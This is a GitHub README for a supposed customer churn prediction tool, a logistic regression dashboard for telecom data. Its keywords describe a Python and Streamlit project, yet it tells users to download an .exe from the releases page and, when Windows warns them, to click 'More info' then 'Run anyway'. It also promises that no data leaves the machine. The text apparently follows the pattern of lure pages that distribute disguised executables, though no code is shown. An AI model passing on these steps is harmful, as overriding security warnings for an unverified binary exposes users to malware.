# 📉 customer-churn-prediction - Forecast customer loss with simple data

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/oraziolucky297/customer-churn-prediction/releases)

This software helps businesses understand why customers leave. It uses a mathematical model to spot patterns in user behavior. You can use these insights to keep your clients happy and loyal. The program runs locally on your computer and focuses on telecommunications data.

## 💻 System Requirements

Before you install this program, check that your computer meets these standards:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Intel Core i3 or equivalent.
*   Memory: 4 GB of RAM.
*   Storage: 200 MB of free disk space.
*   Internet Connection: Required for the first setup.

## ⏬ How to download the software

The program lives on the project release page. Follow these steps to get the file you need:

1.  Visit the official download page here: [https://github.com/oraziolucky297/customer-churn-prediction/releases](https://github.com/oraziolucky297/customer-churn-prediction/releases).
2.  Look for the section marked Latest.
3.  Click the file that ends in .exe.
4.  Save this file to your Downloads folder.

## ⚙️ Running the program

Once the download finishes, open the file to start the installation.

1.  Locate the downloaded file in your browser or within the File Explorer.
2.  Double-click the file to execute the installer.
3.  Windows may show a security prompt. If you see this, click More info and then Run anyway.
4.  Follow the instructions on the screen to finalize the setup.
5.  Launch the application from your desktop icon or the Start menu.

The application starts a small server on your machine and opens a dashboard in your web browser. This dashboard allows you to upload customer data files and generate predictions.

## 📊 Using the dashboard

The main screen displays a simple user interface. You can interact with the system using these basic features:

*   Data Upload: Click the Browse button to select a file from your computer. The system accepts files in CSV format.
*   Analysis View: Once you upload a file, the system processes the information. It shows charts that highlight which customers show signs of leaving.
*   Prediction Results: A table appears at the bottom of the screen. This table lists the probability of churn for each individual customer.
*   Export Data: Click the Save button to download the results as a new file.

## 🔍 Understanding the model

The prediction system uses a balanced logistic regression model. This method classifies customers into two groups: those likely to stay and those likely to leave. 

The software trains on historical data to recognize specific traits. For example, it tracks how long a customer uses the service or the total amount they spend each month. When you input new data, the software compares these current traits against historic patterns. It then assigns a score. A high score suggests a higher risk of churn.

## 🛠 Troubleshooting common issues

If the application fails to run, try these steps:

*   Restart your computer. This clears stuck processes from your memory.
*   Check your firewall settings. Sometimes, security software blocks local web servers. Ensure that access to local host ports is allowed.
*   Check your file format. The predictor tool requires specific column names to work correctly. Ensure your spreadsheet has headings that match the sample files provided within the installation folder.
*   Reinstall the application. Delete the old version and run the installer again to fix corrupted files.

## 📖 Privacy and security

The software performs all calculations on your local machine. No data leaves your computer during the analysis process. You hold full control over your customer lists. We store no logs and track no user activity.

Keywords: classification, customer-churn, customer-retention, data-science, machine-learning, predictive-analytics, python, scikit-learn, streamlit, telecommunications